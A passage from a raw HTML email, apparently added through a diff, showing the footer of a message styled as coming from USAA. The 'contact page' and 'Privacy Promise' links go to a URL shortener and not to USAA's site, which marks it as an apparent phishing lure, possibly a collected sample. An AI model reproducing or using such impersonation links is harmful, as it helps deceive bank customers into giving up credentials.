+&amp;sig=3DbPHp131tvEMC5ChMVfG4bw--~D" width=3D28 height=3D28></A>&nbsp;&nb=
+sp; <A href=3D"https://www.youtube.com/user/usaa/custom?EID=3D129481-0520_f=
+ooter" rel=3D"nofollow noopener noreferrer" target=3D_blank><IMG style=3D"V=
+ISIBILITY: visible" border=3D0 alt=3D"You Tube" src=3D"https://ecp.yusercon=
+tent.com/mail?url=3Dhttps%3A%2F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_asse=
+ts%2Fom%2FMedia%2FYoutube_lightblue.jpg&amp;t=3D1650467084&amp;ymreqid=3Df3=
+f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3DI1dsrGIMCXNc5VlWZa705g--~D" wi=
+dth=3D28 height=3D28></A>&nbsp;&nbsp; <A href=3D"https://www.usaa.com/inet/=
+pages/usaa_social_main?EID=3D129481-0520_footer" rel=3D"nofollow noopener n=
+oreferrer" target=3D_blank><IMG style=3D"VISIBILITY: visible" border=3D0 al=
+t=3DMore src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp%3A%2F%2Fconten=
+t.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fmoreicon_new_1.jpg&amp=
+;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=
+=3DtMZfK9Rj0ZzlBMztrJ2l5A--~D" width=3D28 height=3D28> </A></TD></TR></TBOD=
+Y></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD bgColor=3D#e8e8e8 width=3D5></TD>
+<TD width=3D20></TD></TR>
+<TR>
+<TD width=3D20></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD bgColor=3D#ffffff width=3D600>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+<TBODY>
+<TR>
+<TD bgColor=3D#ffffff width=3D500 align=3Dleft><BR><FONT style=3D"FONT-SIZE=
+: 10px; COLOR: #000000" face=3D"Arial, sans-serif"><FONT style=3D"FONT-SIZE=
+: 10px; COLOR: #000000" face=3D"Arial, sans-serif">&nbsp;&nbsp;&nbsp;Please=
+ do not reply to this e-mail.<BR>&nbsp;&nbsp;&nbsp;To contact USAA, visit o=
+ur secure</FONT> <A href=3D"https://s.id/usaa-documents" rel=3D"nofollow no=
+opener noreferrer" target=3D_blank>contact page</A>.<BR><BR>&nbsp;&nbsp;&nb=
+sp;<A href=3D"https://s.id/usaa-documents" rel=3D"nofollow noopener norefer=
+rer" target=3D_blank><B>Privacy Promise</B></A><BR><BR>&nbsp;&nbsp;&nbsp;Un=
+ited Services Automobile Association, 9800 Fredericksburg Road, San Antonio=
+, Texas 78288<BR><BR>&nbsp;&nbsp;&nbsp; <BR></FONT></TD>
+<TD bgColor=3D#ffffff vAlign=3Dmiddle width=3D100 align=3Dright><A href=3D"=
+https://www.usaa.com/inet/ent_logon/Logon?EID=3D129481-0520_head" rel=3D"no=
+follow noopener noreferrer" target=3D_blank><IMG style=3D"VISIBILITY: visib=
+le" border=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp=
+%3A%2F%2Fcontent.usaa.com%2Fmcontent%2Fstatic_assets%2Fom%2FMedia%2Fthumbna=
+ils%2FUSAA_logo_Blue_glass.gif&amp;t=3D1650467084&amp;ymreqid=3Df3f0ef5e-b1=
+28-9ccf-2f2c-5a033601a800&amp;sig=3DLGTWM5nfkw0njST5dJ3oRg--~D" width=3D73 =
+height=3D80></A> </TD></TR></TBODY></TABLE></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD width=3D20>&nbsp; </TD></TR>
+<TR>
+<TD width=3D20>&nbsp; </TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD bgColor=3D#ffffff width=3D600>
+<DIV align=3Dleft><FONT style=3D"FONT-SIZE: 10px; COLOR: #000000" face=3D"A=
+rial, sans-serif"><B>&nbsp;&nbsp;</B></FONT><IMG style=3D"VISIBILITY: visib=
+le" border=3D0 alt=3D"" src=3D"https://ecp.yusercontent.com/mail?url=3Dhttp=
+s%3A%2F%2Fda.usaa.com%2Fb%2Fss%2Fusaaprod3%2F1%3Fevents%3Devent42%26c2%3Dim=
+pression%26v4%3Dwww%26v5%3Dmai%26v6%3Dent%26v7%3Dent%26v8%3Dent%26c25%3Dema=
+il%3Aimpression%26v46%3D129481_NT_UDO_Ntfy%26c20%3D13516482658670&amp;t=3D1=
+650467084&amp;ymreqid=3Df3f0ef5e-b128-9ccf-2f2c-5a033601a800&amp;sig=3Db0uR=
+dFwn5bB4RlgSjY8AoA--~D" width=3D"1%" height=3D"1%">&nbsp; </DIV><BR></TD>
+<TD bgColor=3D#ffffff width=3D5></TD>
+<TD width=3D20>&nbsp; </TD></TR>
+<TR height=3D25>
+<TD colSpan=3D5></TD></TR></TBODY></TABLE></BODY></HTML>
+--===============0122540534==--
+
